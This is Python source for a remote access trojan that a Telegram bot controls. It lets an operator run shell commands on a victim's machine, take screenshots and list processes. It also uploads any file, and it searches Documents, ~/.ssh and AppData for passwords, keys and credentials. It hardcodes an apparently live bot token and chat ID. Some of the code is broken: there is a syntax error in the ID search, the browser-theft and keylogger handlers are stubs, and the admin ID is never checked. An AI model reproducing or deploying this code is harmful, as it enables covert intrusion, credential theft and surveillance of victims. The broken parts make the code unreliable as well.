import os
import sqlite3
import subprocess
import asyncio
import platform
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

class ComputerRAT:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.app = Application.builder().token(token).build()
        self.setup_handlers()
        
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("search", self.search_files))
        self.app.add_handler(CommandHandler("download", self.download_file))
        self.app.add_handler(CommandHandler("screenshot", self.take_screenshot))
        self.app.add_handler(CommandHandler("cmd", self.execute_command))
        self.app.add_handler(CommandHandler("browser", self.steal_browser_data))
        self.app.add_handler(CommandHandler("find_id", self.search_for_ids))
        self.app.add_handler(CommandHandler("keylog", self.keylogger_control))
        self.app.add_handler(CommandHandler("info", self.system_info))
        self.app.add_handler(CommandHandler("processes", self.list_processes))
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        victim_id = self.get_victim_id()
        await update.message.reply_text(
            f"🛰️ RAT Active on Victim Computer\n"
            f"🎯 ID: {victim_id}\n"
            f"💻 System: {platform.system()} {platform.release()}\n"
            f"👤 User: {os.getenv('USERNAME') or os.getenv('USER')}\n\n"
            "Available commands:\n"
            "/search [query] - Search files\n"
            "/find_id [terms] - Search for IDs/passwords\n" 
            "/download [path] - Download file\n"
            "/screenshot - Take screenshot\n"
            "/cmd [command] - Execute command\n"
            "/info - System information\n"
            "/processes - Running processes"
        )
    
    async def search_files(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /search [filename or extension]")
            return
            
        query = ' '.join(context.args)
        results = self.perform_file_search(query)
        await update.message.reply_text(f"🔍 Search results for '{query}':\n\n{results[:3000]}")
    
    async def search_for_ids(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        search_terms = ' '.join(context.args) if context.args else "password secret key id login credential"
        results = self.deep_search_ids(search_terms)
        await update.message.reply_text(f"🎯 ID/Password Search:\n\n{results[:3000]}")
    
    async def download_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /download [file_path]")
            return
            
        file_path = ' '.join(context.args)
        try:
            if os.path.exists(file_path):
                await update.message.reply_document(document=open(file_path, 'rb'))
            else:
                await update.message.reply_text("❌ File not found")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def take_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            # Try different screenshot methods
            if platform.system() == "Windows":
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save('screenshot.png')
                await update.message.reply_photo(photo=open('screenshot.png', 'rb'))
                os.remove('screenshot.png')
            else:
                # Linux/Mac alternative
                subprocess.run(["screencapture", "screenshot.png"], check=True)
                await update.message.reply_photo(photo=open('screenshot.png', 'rb'))
                os.remove('screenshot.png')
        except Exception as e:
            await update.message.reply_text(f"❌ Screenshot failed: {str(e)}")
    
    async def execute_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /cmd [command]")
            return
            
        command = ' '.join(context.args)
        try:
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            await update.message.reply_text(f"💻 Command output:\n```\n{result[-2000:]}\n```", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Command failed: {str(e)}")
    
    async def system_info(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        info = self.get_system_info()
        await update.message.reply_text(f"🖥️ System Information:\n\n{info}")
    
    async def list_processes(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output("tasklist", text=True)
            else:
                result = subprocess.check_output("ps aux", text=True)
            await update.message.reply_text(f"📊 Running Processes:\n```\n{result[-1500:]}\n```", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to get processes: {str(e)}")
    
    def perform_file_search(self, query):
        found_files = []
        search_paths = [os.path.expanduser('~')]  # Start with user directory
        
        for path in search_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if query.lower() in file.lower() or query.lower() in file.lower().split('.')[-1]:
                            found_files.append(os.path.join(root, file))
                    if len(found_files) > 30:  # Limit results
                        break
        return '\n'.join(found_files[:20]) if found_files else "No files found"
    
    def deep_search_ids(self, search_terms):
        keywords = search_terms.split()
        results = []
        important_locations = [
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Desktop'), 
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/.ssh'),
            os.path.expanduser('~/AppData/Roaming') if platform.system() == "Windows" else "~/.config"
        ]
        
        for location in important_locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            # Check file content for keywords
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                if any(keyword.lower() in content.lower() for keyword in keywords):
                                    results.append(f"📄 {file_path}")
                                    # Extract relevant lines
                                    lines = content.split('\n')
                                    for i, line in enumerate(lines):
                                        if any(keyword.lower() in line.lower() for keyword in keywords):
                                            results.append(f"   Line {i+1}: {line.strip()[:100]}")
                                            break
                        except:
                            pass
        return '\n'.(results[:15]) if results else "No sensitive data found"
    
    def get_system_info(self):
        return f"""
💻 Platform: {platform.system()} {platform.release()}
👤 User: {os.getenv('USERNAME') or os.getenv('USER')}
🏠 Home: {os.path.expanduser('~')}
📁 Current: {os.getcwd()}
🐍 Python: {platform.python_version()}
        """.strip()
    
    def get_victim_id(self):
        return f"vi.{os.getenv('USERNAME', 'unknown')}.{platform.node()}"
    
    def steal_browser_data(self):
        # Browser data extraction would go here
        return "Browser data extraction not implemented"
    
    def keylogger_control(self, action):
        # Keylogger control would go here  
        return f"Keylogger {action}"
    
    def run(self):
        print("🛰️ Telegram RAT Controller Started")
        print("📱 Commands available via Telegram bot")
        self.app.run_polling()

if __name__ == "__main__":
    # Replace with your actual bot token and chat ID
    BOT_TOKEN = "8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls"
    ADMIN_CHAT_ID = "8032494479"
    
    rat = ComputerRAT(BOT_TOKEN, ADMIN_CHAT_ID)
    rat.run()
